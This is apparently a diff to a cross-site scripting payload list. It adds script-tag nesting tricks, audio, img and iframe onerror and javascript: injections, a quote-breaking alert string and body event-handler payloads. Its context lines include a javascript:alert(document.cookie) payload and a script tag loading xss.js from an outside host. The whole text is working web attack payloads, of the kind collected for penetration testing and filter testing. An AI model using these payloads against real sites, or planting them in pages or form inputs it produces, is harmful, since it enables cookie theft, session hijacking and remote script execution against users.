@@ -50,6 +50,16 @@ https://brutelogic.com.br/poc.svg
 http://xss.rocks/scriptlet.html
 javascript:alert(document.cookie)
 poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<script <script>>alert('Gotcha')</script>  
+<audio src/onerror=alert('Gotcha')>
+<iframe src=javascript:alert('Gotcha')>
+<iframe src="javascript:alert(Gotcha)">
+<img src=x onerror=alert(Gotcha)>
+';alert(gotcha); //
+<body onmouseover="print()">
+<body onclick=print()>
+<body onmessage=print()>
+<iframe onload=print()></iframe>
 <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
